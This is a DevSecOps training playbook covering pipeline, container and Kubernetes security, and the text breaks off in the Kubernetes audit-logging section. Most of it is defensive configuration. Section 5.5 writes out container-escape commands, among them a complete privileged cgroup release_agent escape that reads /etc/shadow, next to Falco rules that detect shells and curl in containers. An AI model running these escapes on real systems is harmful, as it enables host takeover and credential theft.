# DevSecOps Professional Playbook
## Based on TryHackMe DevSecOps Learning Path

**Version:** 2.0  
**Author:** PinkOffense Security 🐰💜  
**Date:** February 2026  
**Level:** Intermediate to Advanced  
**Duration:** ~64 hours hands-on

---

## 📋 Table of Contents

1. [Introduction to DevSecOps](#1-introduction-to-devsecops)
2. [Secure Software Development Lifecycle (SSDLC)](#2-secure-software-development-lifecycle-ssdlc)
3. [Security of the Pipeline](#3-security-of-the-pipeline)
4. [Security in the Pipeline](#4-security-in-the-pipeline)
5. [Container Security](#5-container-security)
6. [Kubernetes Security](#6-kubernetes-security)
7. [Infrastructure as Code (IaC) Security](#7-infrastructure-as-code-iac-security)
8. [Secrets Management](#8-secrets-management)
9. [Security Monitoring & Logging](#9-security-monitoring--logging)
10. [DevSecOps Tools Reference](#10-devsecops-tools-reference)
11. [Practical Labs & Challenges](#11-practical-labs--challenges)
12. [Career Path & Certifications](#12-career-path--certifications)

---

## 1. Introduction to DevSecOps

### 1.1 What is DevSecOps?

DevSecOps integrates security practices within the DevOps process, emphasizing security at every stage of the software development lifecycle.

```
Traditional Approach:
┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
│   Dev    │ → │   Test   │ → │ Security │ → │   Ops    │
└──────────┘   └──────────┘   └──────────┘   └──────────┘
                              (Late stage)

DevSecOps Approach:
┌─────────────────────────────────────────────────────────┐
│                    SECURITY EVERYWHERE                   │
├──────────┬──────────┬──────────┬──────────┬────────────┤
│   Plan   │   Code   │  Build   │  Test    │  Deploy    │
│ Threat   │  SAST    │   SCA    │  DAST    │ Runtime    │
│ Modeling │  Linting │ Scanning │  IAST    │ Monitoring │
└──────────┴──────────┴──────────┴──────────┴────────────┘
```

### 1.2 DevOps Evolution

| Era | Approach | Characteristics |
|-----|----------|-----------------|
| **Traditional** | Waterfall | Sequential, siloed teams, long release cycles |
| **Agile** | Iterative | Sprint-based, cross-functional, faster releases |
| **DevOps** | Continuous | CI/CD, automation, collaboration |
| **DevSecOps** | Secure Continuous | Security integrated, shift-left, automated security |

### 1.3 The DevOps Infinity Loop

```
        ┌─────────────────────────────────────┐
        │           CONTINUOUS FEEDBACK       │
        ↓                                     │
   ┌─────────┐    ┌─────────┐    ┌─────────┐ │
   │  PLAN   │ →  │  CODE   │ →  │  BUILD  │ │
   └─────────┘    └─────────┘    └─────────┘ │
        ↑                              ↓      │
   ┌─────────┐    ┌─────────┐    ┌─────────┐ │
   │ MONITOR │ ←  │ DEPLOY  │ ←  │  TEST   │ │
   └─────────┘    └─────────┘    └─────────┘ │
        │                                     │
        └─────────────────────────────────────┘
```

### 1.4 Key DevSecOps Concepts

| Concept | Description |
|---------|-------------|
| **Shift Left** | Move security earlier in the development lifecycle |
| **CI/CD** | Continuous Integration / Continuous Deployment |
| **IaC** | Infrastructure as Code - managing infrastructure through code |
| **Microservices** | Breaking applications into small, independent services |
| **Containers** | Lightweight, portable application packaging |
| **Orchestration** | Managing containerized applications at scale |

### 1.5 DevSecOps Challenges

| Challenge | Description | Solution |
|-----------|-------------|----------|
| **Security Silos** | Fragmented culture, gaps in collaboration | Cross-functional teams, shared responsibility |
| **Lack of Visibility** | Cannot identify risks at right stages | Integrated security dashboards, automation |
| **Stringent Processes** | Overcomplicated security slowing development | Scalable, automated security gates |
| **Cultural Resistance** | Teams resistant to change | Education, incremental adoption |

### 1.6 DevSecOps Benefits

```
┌─────────────────────────────────────────────────────────────┐
│                    DevSecOps Benefits                        │
├─────────────────────────────────────────────────────────────┤
│ ✓ 11.5x faster vulnerability detection and mitigation       │
│ ✓ 50% reduction in security-related deployment failures     │
│ ✓ Early vulnerability detection = lower remediation cost    │
│ ✓ Continuous security monitoring and compliance             │
│ ✓ Improved collaboration between Dev, Sec, and Ops          │
│ ✓ Automated security testing reduces human error            │
└─────────────────────────────────────────────────────────────┘
```

---

## 2. Secure Software Development Lifecycle (SSDLC)

### 2.1 SDLC vs SSDLC

```
Traditional SDLC:
┌──────────┬──────────┬──────────┬──────────┬──────────┬──────────┐
│ Planning │ Analysis │  Design  │   Dev    │  Test    │  Deploy  │
└──────────┴──────────┴──────────┴──────────┴──────────┴──────────┘

Secure SDLC (SSDLC):
┌──────────┬──────────┬──────────┬──────────┬──────────┬──────────┐
│ Planning │ Analysis │  Design  │   Dev    │  Test    │  Deploy  │
├──────────┼──────────┼──────────┼──────────┼──────────┼──────────┤
│ Risk     │ Security │ Threat   │ Secure   │ Security │ Security │
│ Assess   │ Require  │ Modeling │ Coding   │ Testing  │ Review   │
└──────────┴──────────┴──────────┴──────────┴──────────┴──────────┘
```

### 2.2 SSDLC Phases

#### Phase 1: Risk Assessment (Planning)

**Activities:**
- Identify assets and their value
- Identify potential threats
- Assess likelihood and impact
- Prioritize risks

**Tools:**
- Risk matrices
- Threat intelligence feeds
- Compliance requirements mapping

#### Phase 2: Security Requirements (Analysis)

**Key Security Requirements:**
```
┌─────────────────────────────────────────────────────────────┐
│ Authentication: How users prove their identity              │
│ Authorization: What users can access                        │
│ Data Protection: Encryption at rest and in transit          │
│ Input Validation: Prevent injection attacks                 │
│ Logging & Monitoring: Security event tracking               │
│ Error Handling: Secure error messages                       │
│ Session Management: Secure session handling                 │
└─────────────────────────────────────────────────────────────┘
```

#### Phase 3: Threat Modeling (Design)

**STRIDE Model:**

| Threat | Description | Example |
|--------|-------------|---------|
| **S**poofing | Impersonating another user/system | Session hijacking |
| **T**ampering | Modifying data without authorization | SQL injection |
| **R**epudiation | Denying performed actions | Log manipulation |
| **I**nformation Disclosure | Exposing confidential data | Data breach |
| **D**enial of Service | Making system unavailable | DDoS attack |
| **E**levation of Privilege | Gaining unauthorized access | Privilege escalation |

**Threat Modeling Process:**
```
1. Define Security Objectives
         ↓
2. Decompose Application (DFDs)
         ↓
3. Identify Threats (STRIDE)
         ↓
4. Rate Threats (DREAD)
         ↓
5. Plan Mitigations
```

**DREAD Risk Rating:**

| Factor | Question | Scale |
|--------|----------|-------|
| **D**amage | How severe is the impact? | 1-10 |
| **R**eproducibility | How easy to reproduce? | 1-10 |
| **E**xploitability | How easy to exploit? | 1-10 |
| **A**ffected Users | How many users affected? | 1-10 |
| **D**iscoverability | How easy to discover? | 1-10 |

#### Phase 4: Secure Coding (Development)

**Secure Coding Principles:**

```python
# ❌ INSECURE: SQL Injection vulnerable
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# ✅ SECURE: Parameterized queries
def get_user(username):
    query = "SELECT * FROM users WHERE username = %s"
    return db.execute(query, (username,))
```

```python
# ❌ INSECURE: Hardcoded secrets
API_KEY = "sk-1234567890abcdef"

# ✅ SECURE: Environment variables
import os
API_KEY = os.environ.get('API_KEY')
```

**OWASP Secure Coding Guidelines:**
- Input validation (whitelist approach)
- Output encoding
- Authentication and password management
- Session management
- Access control
- Cryptographic practices
- Error handling and logging
- Data protection
- Communication security

#### Phase 5: Security Testing (Test)

| Type | Description | When |
|------|-------------|------|
| **SAST** | Static Application Security Testing | Code commit |
| **DAST** | Dynamic Application Security Testing | Deployed app |
| **IAST** | Interactive Application Security Testing | Runtime |
| **SCA** | Software Composition Analysis | Build |
| **Penetration Testing** | Manual security testing | Pre-release |

#### Phase 6: Security Deployment (Deploy)

**Deployment Security Checklist:**
- [ ] Security configurations verified
- [ ] Secrets not in codebase
- [ ] SSL/TLS certificates valid
- [ ] Security headers configured
- [ ] Monitoring and alerting active
- [ ] Rollback plan ready
- [ ] Incident response plan documented

---

## 3. Security of the Pipeline

### 3.1 CI/CD Pipeline Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                     CI/CD PIPELINE                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌────────┐   ┌────────┐   ┌────────┐   ┌────────┐   ┌────────┐│
│  │ Source │ → │ Build  │ → │  Test  │ → │ Deploy │ → │Monitor ││
│  │  Code  │   │        │   │        │   │        │   │        ││
│  └────────┘   └────────┘   └────────┘   └────────┘   └────────┘│
│       ↑           ↑            ↑            ↑            ↑      │
│   Secrets     Container    SAST/DAST    IaC Scan    Runtime     │
│   Scanning    Scanning     SCA          Config       Security   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Pipeline Components

| Component | Role | Security Considerations |
|-----------|------|------------------------|
| **Build Orchestrator** | Coordinates automation | Access control, secrets management |
| **Build Agents** | Execute build tasks | Isolation, hardening |
| **Artifact Repository** | Store build outputs | Integrity, access control |
| **Source Code Repository** | Version control | Branch protection, code review |

### 3.3 Source Code Security

#### Branch Protection Rules

```yaml
# GitHub branch protection
name: main
protection_rules:
  required_reviews: 2
  dismiss_stale_reviews: true
  require_code_owner_reviews: true
  require_signed_commits: true
  enforce_admins: true
  required_status_checks:
    - security-scan
    - unit-tests
    - lint
```

#### Pre-commit Hooks

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: detect-private-key
      - id: detect-aws-credentials
      - id: check-merge-conflict
      
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
      
  - repo: https://github.com/PyCQA/bandit
    rev: 1.7.6
    hooks:
      - id: bandit
        args: ["-r", "src/"]
```

#### Signed Commits

```bash
# Configure GPG signing
git config --global user.signingkey YOUR_KEY_ID
git config --global commit.gpgsign true

# Sign a commit
git commit -S -m "Signed commit message"

# Verify signature
git log --show-signature
```

### 3.4 CI/CD Security (Jenkins/GitLab)

#### Jenkins Security Best Practices

```groovy
// Jenkinsfile with security gates
pipeline {
    agent any
    
    environment {
        // Never hardcode secrets
        API_KEY = credentials('api-key-id')
    }
    
    stages {
        stage('Secret Scanning') {
            steps {
                sh 'gitleaks detect --source . --verbose'
            }
        }
        
        stage('SAST') {
            steps {
                sh 'semgrep --config=p/security-audit .'
            }
        }
        
        stage('SCA') {
            steps {
                sh 'snyk test --severity-threshold=high'
            }
        }
        
        stage('Build') {
            steps {
                sh 'docker build -t myapp:${BUILD_NUMBER} .'
            }
        }
        
        stage('Container Scan') {
            steps {
                sh 'trivy image myapp:${BUILD_NUMBER}'
            }
        }
        
        stage('DAST') {
            steps {
                sh 'zap-cli quick-scan http://staging.example.com'
            }
        }
    }
    
    post {
        always {
            // Clean up
            cleanWs()
        }
    }
}
```

#### GitLab CI/CD Security

```yaml
# .gitlab-ci.yml
stages:
  - secrets
  - sast
  - sca
  - build
  - container-scan
  - dast
  - deploy

variables:
  SECURE_LOG_LEVEL: "debug"

# Secret Detection
secret_detection:
  stage: secrets
  image: registry.gitlab.com/gitlab-org/security-products/secret-detection
  script:
    - /analyzer run
  artifacts:
    reports:
      secret_detection: gl-secret-detection-report.json

# SAST
sast:
  stage: sast
  image: returntocorp/semgrep
  script:
    - semgrep --config=p/security-audit --json -o semgrep-report.json .
  artifacts:
    reports:
      sast: semgrep-report.json

# Dependency Scanning
dependency_scanning:
  stage: sca
  image: snyk/snyk:docker
  script:
    - snyk test --json > snyk-report.json || true
  artifacts:
    reports:
      dependency_scanning: snyk-report.json

# Container Scanning
container_scanning:
  stage: container-scan
  image: aquasec/trivy
  script:
    - trivy image --format json -o trivy-report.json $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  artifacts:
    reports:
      container_scanning: trivy-report.json

# DAST
dast:
  stage: dast
  image: owasp/zap2docker-stable
  script:
    - zap-baseline.py -t $DAST_TARGET_URL -r zap-report.html
  artifacts:
    paths:
      - zap-report.html
```

### 3.5 GitHub Actions Security

```yaml
# .github/workflows/devsecops.yml
name: DevSecOps Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

permissions:
  contents: read
  security-events: write

jobs:
  # Stage 1: Secret Scanning
  secrets:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Gitleaks
        uses: gitleaks/gitleaks-action@v2

  # Stage 2: SAST
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: p/security-audit

  # Stage 3: SCA
  sca:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Snyk
        uses: snyk/actions/node@master
        with:
          args: --severity-threshold=high
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

  # Stage 4: Container Scan
  container:
    needs: [secrets, sast, sca]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        run: docker build -t myapp:${{ github.sha }} .
      - name: Trivy Scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:${{ github.sha }}
          format: sarif
          output: trivy-results.sarif
      - name: Upload Results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: trivy-results.sarif
```

### 3.6 Build Server Security

**Jenkins Hardening Checklist:**

```
┌─────────────────────────────────────────────────────────────┐
│              Jenkins Security Checklist                      │
├─────────────────────────────────────────────────────────────┤
│ [ ] Enable security realm (LDAP/AD integration)             │
│ [ ] Configure authorization strategy (Matrix-based)         │
│ [ ] Disable remote CLI                                      │
│ [ ] Enable CSRF protection                                  │
│ [ ] Use credentials plugin for secrets                      │
│ [ ] Audit plugin installations                              │
│ [ ] Enable agent-to-controller security                     │
│ [ ] Use HTTPS/TLS                                           │
│ [ ] Regular security updates                                │
│ [ ] Disable script console for non-admins                   │
│ [ ] Implement build timeout policies                        │
└─────────────────────────────────────────────────────────────┘
```

---

## 4. Security in the Pipeline

### 4.1 Static Application Security Testing (SAST)

#### What is SAST?

SAST analyzes source code for security vulnerabilities without executing the application (white-box testing).

```
┌─────────────────────────────────────────────────────────────┐
│                        SAST Process                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Source Code → Lexical Analysis → Semantic Analysis        │
│        ↓                                                     │
│   Control Flow → Data Flow → Taint Analysis                 │
│        ↓                                                     │
│   Pattern Matching → Vulnerability Report                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### SAST Tools

| Tool | Language Support | Type |
|------|------------------|------|
| **SonarQube** | 25+ languages | Open Source/Commercial |
| **Semgrep** | 30+ languages | Open Source |
| **Checkmarx** | 20+ languages | Commercial |
| **Snyk Code** | 15+ languages | Commercial |
| **Bandit** | Python | Open Source |
| **ESLint** | JavaScript | Open Source |

#### SonarQube Integration

```bash
# Install SonarScanner
npm install -g sonarqube-scanner

# Configure sonar-project.properties
cat > sonar-project.properties << EOF
sonar.projectKey=my-project
sonar.projectName=My Project
sonar.sources=src
sonar.host.url=http://sonarqube:9000
sonar.login=\${SONAR_TOKEN}
sonar.language=py
sonar.python.coverage.reportPaths=coverage.xml
EOF

# Run scan
sonar-scanner
```

#### Semgrep Rules

```yaml
# custom-rules.yaml
rules:
  - id: hardcoded-password
    patterns:
      - pattern-either:
          - pattern: password = "..."
          - pattern: PASSWORD = "..."
    message: "Hardcoded password detected"
    severity: ERROR
    languages: [python]
    
  - id: sql-injection
    pattern: |
      cursor.execute("..." + $VAR + "...")
    message: "Potential SQL injection"
    severity: ERROR
    languages: [python]
```

```bash
# Run Semgrep
semgrep --config=p/security-audit --config=custom-rules.yaml .
```

### 4.2 Dynamic Application Security Testing (DAST)

#### What is DAST?

DAST tests running applications for vulnerabilities (black-box testing).

```
┌─────────────────────────────────────────────────────────────┐
│                        DAST Process                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Running Application ← HTTP Requests                        │
│         ↓                                                    │
│   Spider/Crawler → Active Scanner → Fuzzer                  │
│         ↓                                                    │
│   Response Analysis → Vulnerability Detection               │
│         ↓                                                    │
│   Report Generation                                         │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### DAST Tools

| Tool | Type | Best For |
|------|------|----------|
| **OWASP ZAP** | Open Source | General web scanning |
| **Burp Suite** | Commercial | Manual + automated |
| **Nuclei** | Open Source | Template-based scanning |
| **Nikto** | Open Source | Web server scanning |
| **Arachni** | Open Source | Full-featured scanner |

#### OWASP ZAP Automation

```bash
# ZAP Baseline Scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
    -t https://target.example.com \
    -r report.html

# ZAP Full Scan
docker run -t owasp/zap2docker-stable zap-full-scan.py \
    -t https://target.example.com \
    -r full-report.html

# ZAP API Scan
docker run -t owasp/zap2docker-stable zap-api-scan.py \
    -t https://target.example.com/api/openapi.json \
    -f openapi \
    -r api-report.html
```

#### ZAP Automation Framework

```yaml
# zap-automation.yaml
env:
  contexts:
    - name: "Target Application"
      urls:
        - "https://target.example.com"
      includePaths:
        - "https://target.example.com/.*"
      excludePaths:
        - "https://target.example.com/logout.*"
      authentication:
        method: "form"
        parameters:
          loginUrl: "https://target.example.com/login"
          loginRequestData: "username={%username%}&password={%password%}"
        verification:
          method: "response"
          loggedInRegex: "\\QWelcome\\E"
      users:
        - name: "test-user"
          credentials:
            username: "testuser"
            password: "testpass"

jobs:
  - type: spider
    parameters:
      context: "Target Application"
      user: "test-user"
      maxDuration: 5
      
  - type: activeScan
    parameters:
      context: "Target Application"
      user: "test-user"
      policy: "API-Scan"
      
  - type: report
    parameters:
      template: "traditional-html"
      reportFile: "zap-report.html"
```

### 4.3 Software Composition Analysis (SCA)

#### What is SCA?

SCA identifies vulnerabilities in third-party dependencies and open-source components.

```
┌─────────────────────────────────────────────────────────────┐
│                    Dependency Tree                           │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Your Application                                           │
│       ├── Package A (v1.2.3) ← Direct Dependency            │
│       │       └── Package X (v2.0.0) ← Transitive           │
│       │               └── Package Y (v1.5.0) ← VULNERABLE!  │
│       └── Package B (v3.1.0) ← Direct Dependency            │
│               └── Package Z (v1.0.0) ← Transitive           │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### SCA Tools

| Tool | Features | Type |
|------|----------|------|
| **Snyk** | Vulnerabilities, license compliance | Commercial/Free tier |
| **OWASP Dependency-Check** | CVE detection | Open Source |
| **npm audit** | Node.js packages | Built-in |
| **pip-audit** | Python packages | Open Source |
| **Trivy** | Multi-language, containers | Open Source |
| **Dependabot** | Auto PRs for updates | GitHub native |

#### Snyk Integration

```bash
# Install Snyk
npm install -g snyk

# Authenticate
snyk auth

# Test for vulnerabilities
snyk test

# Monitor project
snyk monitor

# Fix vulnerabilities
snyk wizard
```

```yaml
# Snyk in CI/CD
- name: Run Snyk
  run: |
    snyk test --severity-threshold=high
    snyk container test myimage:latest
    snyk iac test ./terraform/
```

#### OWASP Dependency-Check

```bash
# Run dependency check
dependency-check \
    --project "MyProject" \
    --scan ./src \
    --format HTML \
    --out ./reports

# Suppress false positives
cat > suppression.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<suppressions xmlns="https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd">
   <suppress>
      <notes>False positive</notes>
      <cve>CVE-2021-12345</cve>
   </suppress>
</suppressions>
EOF

dependency-check --suppression suppression.xml --scan ./src
```

#### Package Lock Files

```bash
# npm - package-lock.json
npm ci  # Clean install from lock file

# pip - requirements.txt with hashes
pip install --require-hashes -r requirements.txt

# Generate hashes
pip-compile --generate-hashes requirements.in
```

### 4.4 Interactive Application Security Testing (IAST)

IAST combines SAST and DAST, analyzing applications at runtime.

```
┌─────────────────────────────────────────────────────────────┐
│                        IAST Process                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Application with IAST Agent                                │
│         ↓                                                    │
│   Real-time Code Analysis + Runtime Testing                 │
│         ↓                                                    │
│   Precise Vulnerability Location (File + Line)              │
│         ↓                                                    │
│   Lower False Positives than SAST/DAST alone                │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**IAST Tools:** Contrast Security, Seeker, Hdiv

---

## 5. Container Security

### 5.1 Container Security Overview

```
┌─────────────────────────────────────────────────────────────┐
│                Container Security Layers                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   ┌───────────────────────────────────────────────────┐     │
│   │              Application Layer                     │     │
│   │         (Code, Dependencies, Configs)              │     │
│   ├───────────────────────────────────────────────────┤     │
│   │              Container Layer                       │     │
│   │        (Image, Runtime, Orchestration)            │     │
│   ├───────────────────────────────────────────────────┤     │
│   │              Host Layer                            │     │
│   │          (OS, Kernel, Network)                    │     │
│   └───────────────────────────────────────────────────┘     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 5.2 Docker Security

#### Secure Dockerfile

```dockerfile
# ✅ Use specific version, not latest
FROM python:3.11-slim-bullseye

# ✅ Create non-root user
RUN groupadd -r appgroup && useradd -r -g appgroup appuser

# ✅ Set working directory
WORKDIR /app

# ✅ Copy requirements first (layer caching)
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# ✅ Copy application code
COPY --chown=appuser:appgroup . .

# ✅ Switch to non-root user
USER appuser

# ✅ Use EXPOSE for documentation
EXPOSE 8080

# ✅ Use exec form for CMD
CMD ["python", "app.py"]
```

#### Dockerfile Security Checklist

```
┌─────────────────────────────────────────────────────────────┐
│            Dockerfile Security Checklist                     │
├─────────────────────────────────────────────────────────────┤
│ [ ] Use specific base image versions (not :latest)          │
│ [ ] Use minimal base images (alpine, distroless)            │
│ [ ] Run as non-root user                                    │
│ [ ] Don't store secrets in images                           │
│ [ ] Remove unnecessary packages and tools                   │
│ [ ] Use multi-stage builds                                  │
│ [ ] Scan images for vulnerabilities                         │
│ [ ] Sign and verify images                                  │
│ [ ] Use .dockerignore                                       │
│ [ ] Set appropriate file permissions                        │
└─────────────────────────────────────────────────────────────┘
```

#### Multi-stage Build

```dockerfile
# Build stage
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
RUN npm run build

# Production stage
FROM node:18-alpine AS production
WORKDIR /app
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

# Copy only necessary files
COPY --from=builder --chown=appuser:appgroup /app/dist ./dist
COPY --from=builder --chown=appuser:appgroup /app/node_modules ./node_modules

USER appuser
EXPOSE 3000
CMD ["node", "dist/index.js"]
```

### 5.3 Container Runtime Security

#### Docker Security Options

```bash
# Run container with security options
docker run \
    --read-only \                          # Read-only filesystem
    --tmpfs /tmp:rw,noexec,nosuid \       # Writable /tmp
    --cap-drop=ALL \                       # Drop all capabilities
    --cap-add=NET_BIND_SERVICE \          # Add only needed caps
    --security-opt=no-new-privileges \    # No privilege escalation
    --user 1000:1000 \                    # Run as non-root
    --memory="512m" \                     # Memory limit
    --cpus="0.5" \                        # CPU limit
    --pids-limit=100 \                    # Process limit
    --network=isolated_network \          # Isolated network
    myimage:latest
```

#### AppArmor Profile

```bash
# Create AppArmor profile
cat > /etc/apparmor.d/docker-myapp << EOF
#include <tunables/global>

profile docker-myapp flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  
  network inet tcp,
  network inet udp,
  
  deny /etc/shadow r,
  deny /etc/passwd w,
  
  /app/** r,
  /tmp/** rw,
}
EOF

# Load profile
apparmor_parser -r /etc/apparmor.d/docker-myapp

# Run with profile
docker run --security-opt apparmor=docker-myapp myimage:latest
```

#### Seccomp Profile

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "close",
        "stat", "fstat", "mmap", "mprotect",
        "brk", "exit_group"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

```bash
docker run --security-opt seccomp=/path/to/profile.json myimage
```

### 5.4 Container Image Scanning

#### Trivy

```bash
# Scan image
trivy image myimage:latest

# Scan with severity filter
trivy image --severity HIGH,CRITICAL myimage:latest

# Output formats
trivy image -f json -o results.json myimage:latest
trivy image -f sarif -o results.sarif myimage:latest

# Scan filesystem
trivy fs /path/to/project

# Scan IaC
trivy config ./terraform/
```

#### Grype

```bash
# Scan image
grype myimage:latest

# Scan directory
grype dir:/path/to/project

# Fail on severity
grype myimage:latest --fail-on high
```

### 5.5 Container Vulnerabilities

#### Docker Socket Exposure

```bash
# ❌ DANGEROUS: Mounting Docker socket
docker run -v /var/run/docker.sock:/var/run/docker.sock myimage

# This allows container escape:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

#### Privileged Mode Escape

```bash
# ❌ DANGEROUS: Privileged container
docker run --privileged myimage

# Escape via cgroups
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/shadow" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

#### Capabilities Exploitation

```bash
# Check capabilities
capsh --print

# Dangerous capabilities:
# CAP_SYS_ADMIN - Full admin access
# CAP_NET_ADMIN - Network configuration
# CAP_SYS_PTRACE - Process debugging
```

---

## 6. Kubernetes Security

### 6.1 Kubernetes Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                   Kubernetes Cluster                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Control Plane                                              │
│   ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐      │
│   │   API    │ │  etcd    │ │Scheduler │ │Controller│      │
│   │  Server  │ │          │ │          │ │ Manager  │      │
│   └──────────┘ └──────────┘ └──────────┘ └──────────┘      │
│                                                              │
│   Worker Nodes                                               │
│   ┌──────────────────────────────────────────────┐         │
│   │  ┌────────┐ ┌────────┐ ┌────────┐            │         │
│   │  │  Pod   │ │  Pod   │ │  Pod   │            │         │
│   │  └────────┘ └────────┘ └────────┘            │         │
│   │                                               │         │
│   │  kubelet | kube-proxy | Container Runtime    │         │
│   └──────────────────────────────────────────────┘         │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 6.2 Kubernetes Security Best Practices

#### Pod Security Standards

```yaml
# Pod Security Admission (PSA)
apiVersion: v1
kind: Namespace
metadata:
  name: secure-namespace
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

#### Secure Pod Configuration

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
      
  containers:
  - name: app
    image: myapp:v1.0.0
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
    resources:
      limits:
        cpu: "500m"
        memory: "128Mi"
      requests:
        cpu: "250m"
        memory: "64Mi"
    volumeMounts:
    - name: tmp
      mountPath: /tmp
      
  volumes:
  - name: tmp
    emptyDir: {}
    
  automountServiceAccountToken: false
```

### 6.3 RBAC (Role-Based Access Control)

```yaml
# Role - namespace-scoped permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: production
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "watch"]

---
# RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
  namespace: production
subjects:
- kind: User
  name: developer
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io

---
# ClusterRole - cluster-wide permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: secret-reader
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list"]
```

### 6.4 Network Policies

```yaml
# Deny all ingress/egress by default
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress

---
# Allow specific traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: api-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: api
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: database
    ports:
    - protocol: TCP
      port: 5432
```

### 6.5 Secrets Management in K8s

```yaml
# ❌ INSECURE: Plain text secret
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  username: YWRtaW4=  # base64 encoded (NOT encrypted!)
  password: cGFzc3dvcmQ=

# ✅ BETTER: External secrets (e.g., AWS Secrets Manager)
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: aws-secrets-manager
    kind: SecretStore
  target:
    name: db-credentials
  data:
  - secretKey: username
    remoteRef:
      key: prod/db/credentials
      property: username
  - secretKey: password
    remoteRef:
      key: prod/db/credentials
      property: password
```

### 6.6 K8s Runtime Security (Falco)

```yaml
# Falco custom rules
- rule: Detect Shell in Container
  desc: Detects shell spawned inside container
  condition: >
    container.id != host and
    proc.name in (bash, sh, zsh) and
    evt.type = execve
  output: >
    Shell spawned in container
    (user=%user.name container=%container.name
     shell=%proc.name parent=%proc.pname
     cmdline=%proc.cmdline)
  priority: WARNING
  tags: [container, shell]

- rule: Detect Curl in Container
  desc: Detects curl usage in container
  condition: >
    container.id != host and
    proc.name = curl and
    evt.type = execve
  output: >
    Curl used in container
    (user=%user.name container=%container.name
     cmdline=%proc.cmdline)
  priority: NOTICE
  tags: [network, command]
```

### 6.7 Kubernetes Audit Logging

```yaml
# Audit policy
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Log secret access at Metadata level (no content)
